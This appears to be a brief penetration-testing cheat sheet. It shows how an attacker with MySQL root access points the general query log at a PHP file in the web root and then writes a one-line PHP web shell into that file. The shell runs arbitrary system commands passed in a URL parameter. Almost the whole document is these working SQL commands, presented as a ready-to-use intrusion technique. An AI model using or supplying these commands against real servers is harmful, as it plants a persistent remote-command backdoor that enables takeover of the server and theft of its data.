# Mysql change log file to get shell

When you get a mysql `root` user, you can change the log file to get a shell.

``` sql
# Check if the current environment is enabled or not.
SHOW VARIABLES LIKE '%general_log%';

# Enable logging
SET GLOBAL general_log = "ON";

# Set the logging output file
SET GLOBAL general_log_file="/var/www/html/shell.php";

# Then all the commands you type will be recorded in the log file.
SELECT '<?php system($_GET["cmd"]);?>';

# disable logging
set global general_log = off;
```